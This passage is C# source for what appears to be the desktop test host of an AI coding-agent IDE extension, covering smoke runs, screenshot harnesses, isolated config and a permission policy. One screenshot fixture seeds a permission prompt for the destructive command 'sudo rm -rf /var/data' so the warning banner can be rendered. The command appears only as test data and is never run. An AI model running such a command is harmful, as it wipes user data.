using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using CodeWicket.Core;
using CodeWicket.Core.Ide;
using CodeWicket.Ipc;
using CodeWicket.Shell;
using CodeWicket.UI.Diagnostics;
using CodeWicket.UI.Markdown;
using CodeWicket.UI.ViewModels;

namespace CodeWicket.Desktop
{
    public partial class App : Application
    {
        private EngineClient? _engine;

        // Desktop has no VS diff viewer; this fake openDiff records the last-opened path so edit rows are
        // clickable in the harness and the smoke can verify the banner's "View diff" wiring.
        private string? _lastDiffOpened;

        /// <summary>Where the last "open this file" navigation went (Desktop has no editor, so the smoke
        /// checks the request instead of the result — same trick as <see cref="_lastDiffOpened"/>).</summary>
        private (string Path, int Line)? _lastFileOpened;

        protected override async void OnStartup(StartupEventArgs e)
        {
            base.OnStartup(e);

            var smoke = e.Args.Contains("--smoke");
            // Scratch beside the binary (<bin>/scratch/desktop, or under CWKT_SCRATCH_DIR) so smoke and
            // screenshot artifacts are easy to find rather than buried in the system temp folder.
            var workDir = HostScratch.ResolveDir("desktop");

            // Isolate the config for the automated runs, BEFORE anything reads it (the chat view loads
            // it in its constructor). These modes drive real UI gestures and some of those persist —
            // the zoom checks write chatZoom four times a run — so without this every verification run
            // quietly rewrote the developer's own settings on the same machine. Interactive runs still
            // share the real config on purpose: that parity is the point of the host.
            var automated = e.Args.Any(a =>
                a == "--smoke" || a == "--perf" || a.StartsWith("--screenshot", StringComparison.Ordinal));
            if (automated)
            {
                ExtensionConfig.RedirectTo(Path.Combine(workDir, "config.json"));
                // Same reason, different directory: sending a message WRITES its attachments, so a
                // self-check that pastes an image would otherwise leave test pictures in the
                // developer's own LocalAppData (issue #118).
                AttachmentStore.RedirectTo(Path.Combine(workDir, "attachments"));
            }
            else if (ExtensionConfig.Load().LogRendering)
            {
                // Chat rendering diagnostics (issue #86), as the VSIX installs them — interactive runs
                // share the real config on purpose, so this host previews the real behaviour.
                // Deliberately NOT in the automated runs: there is no redirect for the log directory
                // (unlike config and attachments), so a self-check would write its own render costs into
                // the developer's logs, where they would later read as having come from devenv.
                RenderDiagnosticsLog.EnableFileLog();
                DispatcherTrace.Install(System.Windows.Threading.Dispatcher.CurrentDispatcher);
            }

            // Attachment retention (issue #118), scheduled off-thread. AFTER the redirect above, which
            // is the whole reason this is wired in the hosts rather than in the view-model that writes
            // the files: a sweep reaching the real directory from an automated run would delete the
            // developer's own attachments.
            AttachmentStore.SweepInBackground();

            // Surface otherwise-silent UI-thread exceptions (e.g. XAML/binding faults) to a file so
            // the headless screenshot/smoke runs are diagnosable.
            DispatcherUnhandledException += (_, ex) =>
            {
                try { File.WriteAllText(Path.Combine(workDir, "crash.txt"), ex.Exception.ToString()); } catch { }
            };

            var stub = new StubIdeServices(workDir);
            // Permission policy (mode + remembered choices + command lists) in front of the banner
            // router. The dev/test knobs are command-line args (explicit, per-run, no leaked state):
            //   --permission-mode <Prompt|AcceptReads|AcceptEdits|AcceptAll>
            //   --allow <glob>   --deny <glob>   (each repeatable)
            var modeName = OptionValue(e.Args, "--permission-mode") ?? "Prompt";
            var initialMode = PermissionModeParser.Parse(modeName);
            var permissionRouter = new UiPermissionRouter(stub.Permissions);
            var permissionPolicy = new PolicyPermissionHandler(permissionRouter, initialMode);
            permissionPolicy.SetCommandPolicy(OptionValues(e.Args, "--allow"), OptionValues(e.Args, "--deny"));
            permissionPolicy.SetToolRisks(stub.Tools.Tools);
            // The root the link guard measures from; the stub host's workspace never moves.
            permissionPolicy.AgentWorkspaceRoot = workDir;
            IIdeServices ide = new PermissionOverrideIdeServices(stub, permissionPolicy);

            try
            {
                var enginePath = EnginePathResolver.Resolve();
                // The real backends stay REGISTERED under --fake; only the default changes. That was
                // harmless while nothing asked a non-selected provider anything - and it stopped being
                // harmless the moment the CLI-session picker began asking them ALL (issue #108), because
                // an automated run then spawns the user's real kiro-cli and claude-agent-acp and reads
                // their conversation stores. Measured before this line existed: a --smoke run listed 24
                // of the developer's actual Claude Code conversations.
                //
                // Same rule and the same set of modes as the config and attachment redirects above: an
                // automated run must not touch the user's real state. Interactive runs keep every
                // backend, because listing a real CLI session is exactly what this host is for.
                var engineEnv = automated
                    ? new Dictionary<string, string> { ["CWKT_DISABLED_PROVIDERS"] = "kiro,claude-code" }
                    : null;

                _engine = EngineClient.Launch(enginePath, ide, useFake: true,
                    log: s => Debug.WriteLine("[engine] " + s),
                    env: engineEnv,
                    rawLogPath: OptionValue(e.Args, "--engine-log"));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, $"{Branding.ProductName} — engine launch failed",
                    MessageBoxButton.OK, MessageBoxImage.Error);
                Shutdown(2);
                return;
            }

            // Per-workspace transcript store under the host scratch dir (not the user's real %APPDATA%).
            // For the deterministic headless runs, start from a clean slate and don't restore.
            var screenshot = e.Args.Contains("--screenshot");
            var screenshotHistory = e.Args.Contains("--screenshot-history");
            var screenshotResume = e.Args.Contains("--screenshot-resume");
            var screenshotEdit = e.Args.Contains("--screenshot-edit");
            var screenshotFlagged = e.Args.Contains("--screenshot-flagged");
            var screenshotTyping = e.Args.Contains("--screenshot-typing");
            var screenshotHeld = e.Args.Contains("--screenshot-held");
            var screenshotAttachment = e.Args.Contains("--screenshot-attachment");
            var screenshotPermission = e.Args.Contains("--screenshot-permission");
            var screenshotSubagents = e.Args.Contains("--screenshot-subagents");
            var screenshotMcpRows = e.Args.Contains("--screenshot-mcp-rows");
            var screenshotDrilldown = e.Args.Contains("--screenshot-drilldown");
            var screenshotCliSessions = e.Args.Contains("--screenshot-cli-sessions");
            var screenshotDebugContext = e.Args.Contains("--screenshot-debug-context");
            var screenshotSessionInfo = e.Args.Contains("--screenshot-session-info");
            var perf = e.Args.Contains("--perf");
            var headless = smoke || perf || screenshot || screenshotHistory || screenshotResume || screenshotEdit
                || screenshotFlagged || screenshotTyping || screenshotHeld || screenshotAttachment
                || screenshotDebugContext
                || screenshotSessionInfo
                || screenshotPermission || screenshotSubagents || screenshotMcpRows || screenshotDrilldown || screenshotCliSessions;
            var sessionsDir = Path.Combine(workDir, "sessions");
            if (headless)
                try { if (Directory.Exists(sessionsDir)) Directory.Delete(sessionsDir, recursive: true); } catch { }
            var store = new FileSessionStore(sessionsDir);

            var request = new StartSessionRequest("fake", null, workDir, modeName, null);
            var vm = new ChatViewModel(_engine, request,
                openDiff: (path, _, _, _) => { _lastDiffOpened = path; return Task.CompletedTask; },
                setPermissionMode: name =>
                {
                    if (Enum.TryParse<PermissionMode>(name, ignoreCase: true, out var m))
                        permissionPolicy.Mode = m;
                },
                onNewSession: permissionPolicy.ResetRemembered,
                workspaceNotice: "No project (Desktop host). Sandbox workspace:\n" + workDir,
                sessionStore: store,
                openFile: (path, line) => { _lastFileOpened = (path, line); return Task.CompletedTask; },
                // Pointed at the scratch dir, never at ExtensionConfig.LogDirectory: that one is
                // deliberately outside the automated runs' redirect, so reading it here would bake the
                // developer's real %LOCALAPPDATA% path into every screenshot artifact (issue #160).
                sessionEnvironment: () => new SessionEnvironment(
                    Path.Combine(workDir, "logs"),
                    Path.Combine(workDir, "logs", "engine.log"),
                    Path.Combine(workDir, "logs", "acp.log"),
                    Path.Combine(workDir, "logs", "engine-channel.log"),
                    Path.Combine(workDir, "logs", "render.log"),
                    acpLogEnabled: false,
                    engineChannelLogEnabled: false,
                    renderLogEnabled: false,
                    kiroAgentEngine: null));
            // The tray's opening rung, from the same setting the VSIX reads (issue #190). Config is
            // redirected to the scratch dir under the automated runs, so this is Queue there — which is
            // the default the held-message checks are written against.
            vm.PendingReleaseMode = PendingReleaseModes.Parse(ExtensionConfig.Load().DefaultMessageRelease);
            permissionRouter.Prompt = vm.RequestPermissionAsync;
            // Same wiring as the VSIX host: the policy reports each decision onto its transcript row.
            permissionPolicy.OutcomeReported = vm.NotePermissionOutcome;
            RegisterFakeContextSources(vm);

            async Task InitAndRestoreAsync()
            {
                await vm.InitializeAsync().ConfigureAwait(true);
                if (!headless)
                    vm.RestoreMostRecentSession();
            }
            // Started, not awaited: the window has to paint before the provider round-trip finishes,
            // which is the whole point of doing it this way in the interactive host. The TASK is kept
            // because every harness below runs an InitializeAsync of its own on this same view-model,
            // and ChatViewModel.InitializeAsync has no re-entrancy guard — two of them in flight both
            // suspend on ListProvidersAsync, both run Providers.Clear() and re-add, and whichever
            // finishes first calls SetInitializing(false) while the other is still mid-rebuild (#247).
            var startupInit = InitAndRestoreAsync();

            var window = new MainWindow { DataContext = vm };
            // --width <px>: the chat is width-sensitive by design (the user bubble is a fraction of the
            // transcript), and a VS tool window spans a ~350px dock to a floated full-screen window —
            // so the headless shots need to be takeable at both ends, not just the default 440.
            if (double.TryParse(OptionValue(e.Args, "--width"), NumberStyles.Float,
                    CultureInfo.InvariantCulture, out var width) && width > 0)
                window.Width = width;
            window.Show();

            // The harnesses own the view-model from here, so the startup init has to be FINISHED before
            // one of them starts a second. Awaited after Show() so it costs the headless runs nothing
            // they were not already paying.
            if (headless)
                await startupInit.ConfigureAwait(true);

            if (smoke)
                await RunSmokeAsync(vm, stub, workDir, modeName, store, window).ConfigureAwait(true);
            else if (perf)
                await PerfHarness.RunAsync(vm, window, workDir, e.Args).ConfigureAwait(true);
            else if (screenshot)
                await RunScreenshotAsync(vm, window, workDir).ConfigureAwait(true);
            else if (screenshotHistory)
                await RunHistoryScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotResume)
                await RunResumeScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotEdit)
                await RunEditPermissionScreenshotAsync(vm, window, workDir).ConfigureAwait(true);
            else if (screenshotFlagged)
                await RunFlaggedPermissionScreenshotAsync(vm, window, workDir).ConfigureAwait(true);
            else if (screenshotTyping)
                await RunTypingScreenshotAsync(vm, window, workDir).ConfigureAwait(true);
            else if (screenshotHeld)
                await RunHeldScreenshotAsync(vm, window, workDir).ConfigureAwait(true);
            else if (screenshotAttachment)
                await RunAttachmentScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotPermission)
                await RunPermissionScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotSubagents)
                await RunSubagentScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotMcpRows)
                await RunMcpRowsScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotDrilldown)
                await RunDrilldownScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotCliSessions)
                await RunCliSessionsScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotDebugContext)
                await RunDebugContextScreenshotAsync(vm, window, store, workDir).ConfigureAwait(true);
            else if (screenshotSessionInfo)
                await RunSessionInfoScreenshotAsync(vm, window, workDir).ConfigureAwait(true);
        }

        /// <summary>
        /// The session information panel, opened over a live session (issue #160).
        ///
        /// <para><b>It exists for the two questions no assertion can answer.</b> The first is the
        /// GLYPH: <c>E946</c> is Info by memory, and a wrong Segoe MDL2 codepoint renders as a
        /// missing-glyph box that every string assertion in the suite reads as a perfectly good icon.
        /// The second is whether a two-column row survives an ABSOLUTE PATH — the log folder and the
        /// working directory are the longest strings this pane has ever put in a fixed-width card, and
        /// whether the label column gets squeezed to nothing at <c>MaxWidth=420</c> is decided by
        /// layout, not by XAML that looks reasonable.</para>
        ///
        /// <para>A turn is driven first because the panel is deliberately different before a session
        /// exists: the negotiated rows are absent rather than unknown, so a picture of the unstarted
        /// pane would show none of what this is for.</para>
        /// </summary>
        private async Task RunSessionInfoScreenshotAsync(ChatViewModel vm, Window window, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-session-info.png");
            try
            {
                await vm.InitializeAsync().ConfigureAwait(true);

                // A session has to be OPEN for the panel to have anything to report - the negotiated
                // rows come from a handshake, and the fake's is deliberately mixed (one capability
                // offered, one refused, one never mentioned) so all three renderings appear at once.
                vm.InputText = "What am I talking to?";
                vm.SendCommand.Execute(null);

                // Answer the permissions the fake's script raises, rather than capturing while one is
                // parked. The turn has to REACH ITS END for this picture to be worth taking: the
                // context ring is Visibility-bound to HasUsage and the fake reports usage in the
                // script's final frames, so a run stopped at a banner renders the info button beside
                // an empty strip - and the one thing this shot is now for is the two of them TOGETHER,
                // the glyph having been sized against the ring it sits next to.
                for (var guard = 0; guard < 12; guard++)
                {
                    await WaitForTranscriptAsync(
                        () => !vm.IsBusy || vm.HasPendingPermission,
                        TimeSpan.FromSeconds(20)).ConfigureAwait(true);
                    if (!vm.HasPendingPermission)
                        break;
                    (vm.PendingPermission?.Options.FirstOrDefault(o => o.IsAllow))?.Command.Execute(null);
                }

                // Opening the popup is what issues the pull, so the wait below is for the engine's
                // answer rather than for layout: captured too early the rows read "not read yet",
                // which is a real state but not the one this picture is for.
                vm.IsSessionInfoOpen = true;
                await WaitForTranscriptAsync(
                    () => vm.SessionInfo.Rows.Any(r => r.Label == "Negotiated"
                        && r.Value != "not read yet"),
                    TimeSpan.FromSeconds(10)).ConfigureAwait(true);

                if (window.Content is FrameworkElement chat &&
                    chat.FindName("SessionInfoPopup") is System.Windows.Controls.Primitives.Popup popup)
                {
                    popup.IsOpen = true;
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                    // A popup renders into its own window, so the ordinary window capture cannot reach
                    // it - the child visual is rendered directly, as the history picker's does.
                    if (popup.Child is FrameworkElement child)
                    {
                        child.UpdateLayout();
                        CaptureVisualToPng(child,
                            (int)System.Math.Ceiling(child.ActualWidth),
                            (int)System.Math.Ceiling(child.ActualHeight), path);
                    }
                }

                // The whole window too, at its real size. The button now sits in the STATUS STRIP,
                // outboard of the context ring, so this shot is what settles two things no assertion
                // can: that E946 renders as an icon rather than a fallback box, and that the glyph
                // reads at strip scale beside the ring it is docked against.
                window.UpdateLayout();
                CaptureToPng(window, Path.Combine(workDir, "screenshot-session-info-header.png"));
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-session-info-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// An attached break-mode capture, in both places it appears: expanded in the composer as the
        /// user is about to send it, and collapsed on the bubble of a message already sent.
        ///
        /// <para><b>It exists for the half no assertion reaches, and the half is unusually large here.</b>
        /// <c>DebugStateFormatter</c>'s two renderings - the block and the chip's label - were written
        /// against the probe's SHAPES rather than against anything it printed, so nothing has ever
        /// looked at one. Whether the block reads as evidence or as a wall, whether the label is short
        /// enough to sit in a strip, and whether an expanded capture swamps the composer are all
        /// questions only a picture answers.</para>
        ///
        /// <para>The composer chip is opened deliberately: collapsed it is one line and says nothing
        /// about the thing it exists to let the user check, which is exactly what they are about to
        /// hand over.</para>
        /// </summary>
        private async Task RunDebugContextScreenshotAsync(
            ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-debug-context.png");
            try
            {
                // Seeded and RESTORED rather than driven through the fake's scripted turn, which is
                // long enough to push the bubble off the top of the frame - and scrolling back is
                // rightly refused while the transcript is following (issue #90).
                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "Why is depth wrong?",
                    ProviderId = "fake",
                };
                session.Log.Add(new TranscriptEntry
                {
                    Role = "user",
                    Text = "why is depth 9 here rather than 1?",
                    Contexts = new List<ContextEntry>
                    {
                        new ContextEntry
                        {
                            Kind = HostPromptBlocks.DebugState.Name,
                            Label = DebugStateFormatter.Label(FakeDebugCapture(workDir)),
                            Text = DebugStateFormatter.Format(FakeDebugCapture(workDir), workDir),
                        },
                    },
                });
                session.Log.Add(new TranscriptEntry
                {
                    Role = "agent",
                    Event = new AgentEventDto
                    {
                        Type = "text",
                        Text = "Recurse counts DOWN from MaxDepth, so the innermost frame is the last one.",
                    },
                });
                session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "turnDone" } });
                store.Save(session);

                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();

                // ...and one still in the composer, expanded, which is the state the user reads before
                // deciding to send.
                await vm.AddContextAsync(HostPromptBlocks.DebugState.Name).ConfigureAwait(true);
                if (vm.PendingContexts.FirstOrDefault() is { } pending)
                    pending.IsExpanded = true;
                vm.InputText = "and now it stops here instead";

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);

                // Second artifact: the menu itself, open, with one item enabled and one not. --smoke
                // asserts its theming by brush reference, which is real but is not the same question -
                // the defect being guarded (WPF's platform-light chrome inside a dark pane) is purely
                // visual, and so is whether a disabled item reads as unavailable rather than as broken.
                // Rendered from the ContextMenu itself: a menu lives in its own hwnd, so the window
                // capture above cannot see it.
                if (FindDescendantByName(window, "AddContextButton") is System.Windows.Controls.Button add
                    && add.ContextMenu is { } addMenu)
                {
                    add.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    addMenu.UpdateLayout();
                    CaptureElementToPng(addMenu, Path.Combine(workDir, "screenshot-debug-context-menu.png"));
                    addMenu.IsOpen = false;
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// The history picker showing BOTH of its sections (issue #108): the conversations we hold above,
        /// the ones only the backend's CLI holds below.
        /// <para>Its whole reason for existing is the half no assertion reaches. <c>--smoke</c> can say
        /// the CLI rows are there and that the right one was dropped; it cannot say whether the divider
        /// and the "From the agent's own history" heading read as a section break rather than as two
        /// lists run together,
        /// whether a backend-generated title trims sensibly beside our own, or whether the second list
        /// is cramped against the bottom of a popup sized for the first.</para>
        /// <para>The popup renders in its own window, so the ordinary window capture cannot reach it -
        /// the popup's child visual is rendered directly, exactly as <c>--screenshot-history</c> does.</para>
        /// </summary>
        private async Task RunCliSessionsScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-cli-sessions.png");
            try
            {
                // None of these carries a ConversationId, so neither of the fake's two CLI conversations
                // is deduped away and the lower section has rows to draw. That is the shot's subject; the
                // dedupe itself is the smoke's business.
                SeedSampleSessions(store, workDir);

                // The CLI listing goes to the SELECTED provider, so the catalog has to be loaded before
                // there is a provider to ask.
                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RefreshHistory();
                await vm.RefreshBackendSessionsAsync().ConfigureAwait(true);

                // The picker opens on the saved list, and this shot's subject is the other tab - so it
                // selects it, exactly as the user would. That also makes the pair of shots cover both
                // halves: --screenshot-history is the same popup on its default tab.
                vm.HistoryTab = CodeWicket.UI.ViewModels.HistoryTab.Backend;
                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                if (window.Content is FrameworkElement chat &&
                    chat.FindName("HistoryPopup") is System.Windows.Controls.Primitives.Popup popup)
                {
                    popup.IsOpen = true;
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);

                    try
                    {
                        if (popup.Child is FrameworkElement child)
                        {
                            child.UpdateLayout();
                            CaptureVisualToPng(child,
                                (int)System.Math.Ceiling(child.ActualWidth),
                                (int)System.Math.Ceiling(child.ActualHeight), path);
                        }
                    }
                    finally
                    {
                        // CLOSED before shutting down, and this is not tidiness. An open Popup is its
                        // own top-level HWND rather than one of the Application's windows, so Shutdown
                        // does not close it - and this is the only screenshot mode that ALSO holds a
                        // live engine connection, whose stream pumps keep the process up. Measured: the
                        // work completed every time (the PNG was written, no error file) and the process
                        // then failed to exit, timing out the gate at 180s. Exactly the shape AGENTS.md
                        // records for screenshot-held, which is excluded from the default set for it.
                        popup.IsOpen = false;
                        await System.Windows.Threading.Dispatcher.Yield(
                            System.Windows.Threading.DispatcherPriority.Background);
                    }
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-cli-sessions-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// A sub-agent's calls opened as their own transcript, at DEPTH 2 (issue #148) - so the
        /// breadcrumb can be looked at, which is the half no assertion covers: whether the path reads as
        /// a path, how a long tool title trims, and whether the crumbs are legible against the theme.
        /// <para>Two things only a picture catches. The jump-to-latest pill shares the transcript's grid
        /// row, so if that row is not moved when the breadcrumb takes one the pill renders INSIDE the
        /// crumb bar, sitting on top of it - nothing asserts the <c>Grid.Row</c>. And the crumb bar is
        /// chrome, so it must follow the environment font rather than the transcript's zoom. The shot is
        /// therefore taken scrolled AWAY from the bottom, which is the only state the pill appears
        /// in.</para>
        /// <para>Seeded and restored rather than driven through the fake's turn, per the rule the
        /// attachment shot established: the scripted turn is long enough to push these rows off the top
        /// of the frame, and scrolling back is correctly refused while the transcript is following.</para>
        /// </summary>
        private async Task RunDrilldownScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-drilldown.png");
            try
            {
                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "Audit the permission path",
                    ProviderId = "fake",
                };
                session.Log.Add(new TranscriptEntry { Role = "user", Text = "audit the permission path for me" });
                session.Log.Add(new TranscriptEntry
                {
                    Role = "agent",
                    Event = new AgentEventDto { Type = "text", Text = "Fanning out; one of them is delegating again." },
                });

                void Add(AgentEventDto ev) => session.Log.Add(new TranscriptEntry { Role = "agent", Event = ev });

                Add(Tool("t1", "Audit the permission path end to end", "think", launch: true));
                // Deep enough to be worth opening, and long enough for the crumb to have to trim.
                for (var i = 0; i < 18; i++)
                {
                    Add(Tool($"t1-{i}", $"Read PermissionPolicy{i}.cs", "read", parent: "t1"));
                    Add(Done($"t1-{i}"));
                }
                // ...and one of those children is itself a launch, which is what makes depth 2 ordinary
                // rather than contrived: nesting is recursive, so a sub-agent's own sub-agent is just a
                // child row.
                Add(Tool("t2", "Summarise the caution tier", "think", parent: "t1", launch: true));
                for (var i = 0; i < 12; i++)
                {
                    Add(Tool($"t2-{i}", $"Grep AlwaysPromptCommands #{i}", "search", parent: "t2"));
                    Add(Done($"t2-{i}"));
                }
                Add(Done("t2"));
                Add(Done("t1"));
                Add(new AgentEventDto { Type = "turnDone" });
                store.Save(session);

                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();
                await SettleAsync(window).ConfigureAwait(true);

                if (window.Content is CodeWicket.UI.Views.ChatView view)
                {
                    var outer = vm.Items.OfType<ToolItemViewModel>().FirstOrDefault(t => t.ToolCallId == "t1");
                    view.OpenChildTranscriptForDiagnostics(outer);
                    await SettleAsync(window).ConfigureAwait(true);

                    var inner = outer?.Children.OfType<ToolItemViewModel>()
                        .FirstOrDefault(t => t.ToolCallId == "t2");
                    view.OpenChildTranscriptForDiagnostics(inner);
                    await SettleAsync(window).ConfigureAwait(true);

                    // Away from the bottom, so the pill is on screen and its row can be seen.
                    var items = FindDescendantByName(window, "TranscriptItems");
                    if (items is UIElement itemsEl && view.TranscriptScrollForDiagnostics is { } scroll)
                    {
                        for (var i = 0; i < 3; i++)
                        {
                            itemsEl.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                                System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                            {
                                RoutedEvent = UIElement.PreviewMouseWheelEvent,
                            });
                            scroll.RaiseEvent(new System.Windows.Input.MouseWheelEventArgs(
                                System.Windows.Input.Mouse.PrimaryDevice, Environment.TickCount, 120)
                            {
                                RoutedEvent = UIElement.MouseWheelEvent,
                            });
                        }
                        await SettleAsync(window).ConfigureAwait(true);
                    }
                }

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-drilldown-error.txt"), ex.ToString());
            }

            Shutdown(0);

            static AgentEventDto Tool(string id, string title, string kind, string? parent = null, bool launch = false) =>
                new()
                {
                    Type = "toolStart",
                    ToolCallId = id,
                    Title = title,
                    Kind = kind,
                    ParentToolCallId = parent,
                    IsSubagentLaunch = launch ? true : null,
                };

            static AgentEventDto Done(string id) =>
                new() { Type = "toolDone", ToolCallId = id, Success = true };
        }

        /// <summary>
        /// Seeds a flagged (sensitive / always-prompt) command permission and renders the banner to a PNG,
        /// so the caution UI — red outline, red matched-text call-out, "Allow always" removed — can be
        /// eyeballed offline.
        /// </summary>
        private async Task RunFlaggedPermissionScreenshotAsync(ChatViewModel vm, Window window, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-flagged.png");
            try
            {
                await vm.InitializeAsync().ConfigureAwait(true);

                _ = vm.RequestPermissionAsync(new PermissionRequestDto(
                    "flag-shot", "Running: sudo rm -rf /var/data", "execute",
                    "sudo rm -rf /var/data", "sudo rm -rf /var/data",
                    new[]
                    {
                        new PermissionOptionDto("allow_once", "Allow", "AllowOnce"),
                        new PermissionOptionDto("allow_always", "Allow always", "AllowAlways"),
                        new PermissionOptionDto("reject_once", "Deny", "RejectOnce"),
                    },
                    FlaggedFragment: "rm -rf"));

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-flagged-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>Exposes <see cref="OptionValue"/> to <see cref="PerfHarness"/>, which parses its own args.</summary>
        internal static string? PerfOptionValue(string[] args, string name) => OptionValue(args, name);

        /// <summary>
        /// Captures the "Working" indicator on a SHORT conversation — the case it is hardest to see in,
        /// and the one that drove its redesign. The transcript sits at the top of a mostly empty pane
        /// while the indicator lives in its own row beneath the list, so this shot is the check that the
        /// two still read as connected rather than the indicator floating alone at the bottom.
        /// </summary>
        private async Task RunTypingScreenshotAsync(ChatViewModel vm, Window window, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-typing.png");
            try
            {
                await vm.InitializeAsync().ConfigureAwait(true);

                vm.InputText = "Summarise what this solution does.";
                vm.SendCommand.Execute(null);

                // IsAgentTyping is derived (busy, with no assistant text streaming yet), so it can only
                // be reached by driving a real turn — it cannot be set from here.
                await WaitForTranscriptAsync(() => vm.IsAgentTyping, TimeSpan.FromSeconds(20)).ConfigureAwait(true);

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-typing-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// Captures the held-message tray (issue #70) with two messages waiting on a running tool call —
        /// the state the feature exists for, and one that only appears mid-turn, so it cannot be
        /// eyeballed by opening the app and looking. Two messages rather than one because the row layout
        /// has to hold up repeated, and because the batch is what a release actually delivers.
        /// </summary>
        /// <summary>
        /// The attachment surfaces, rendered (issue #118): a sent message's thumbnail in the transcript
        /// and a chip waiting in the composer. Both are judged by looking at them — sizing, the chip's
        /// name/size stack, whether a thumbnail crowds the bubble — which no assertion covers.
        /// </summary>
        /// <summary>
        /// A sub-agent fan-out, both flavours, with one parent opened (issue #125) — so the nesting can
        /// be LOOKED at, which is the one thing the smoke check cannot do for you: it can prove the
        /// child rows realised, not that the indentation, the chevron and the "N calls" label read as
        /// one row containing others.
        /// <para>Seeded and restored, per the rule the attachment shot established: the fake's scripted
        /// turn is long enough to push these rows off the top of the frame, and scrolling back is
        /// correctly refused while the transcript is following (issue #90).</para>
        /// </summary>
        private async Task RunSubagentScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-subagents.png");
            try
            {
                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "Map the solution",
                    ProviderId = "fake",
                };
                session.Log.Add(new TranscriptEntry { Role = "user", Text = "map this solution for me" });
                session.Log.Add(new TranscriptEntry
                {
                    Role = "agent",
                    Event = new AgentEventDto { Type = "text", Text = "I'll fan out a couple of read-only agents." },
                });

                void Add(AgentEventDto ev) => session.Log.Add(new TranscriptEntry { Role = "agent", Event = ev });

                // Collapsed: one line standing in for its children, which is the claim being made.
                Add(Tool("p1", "Summarize test methods", "think", launch: true));
                Add(Tool("p1-a", "Find `**/*Tests.cs`", "search", parent: "p1"));
                Add(Done("p1-a"));
                Add(Tool("p1-b", "Read ChatViewModelTests.cs", "read", parent: "p1"));
                Add(Done("p1-b"));
                Add(Done("p1"));

                // The async one, opened below, showing the launched state and the rows underneath it.
                Add(Tool("p2", "Map solution projects", "think", launch: true));
                Add(new AgentEventDto
                {
                    Type = "toolDone", ToolCallId = "p2", Success = true, LaunchedInBackground = true,
                });
                Add(Tool("p2-a", "Find `**/*.csproj`", "search", parent: "p2"));
                Add(Done("p2-a"));
                Add(Tool("p2-b", "Read Directory.Build.props", "read", parent: "p2"));
                Add(Done("p2-b"));
                Add(new AgentEventDto { Type = "turnDone" });
                store.Save(session);

                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();

                foreach (var row in vm.Items.OfType<ToolItemViewModel>())
                    row.IsExpanded = row.ToolCallId == "p2";

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-error.txt"), ex.ToString());
            }

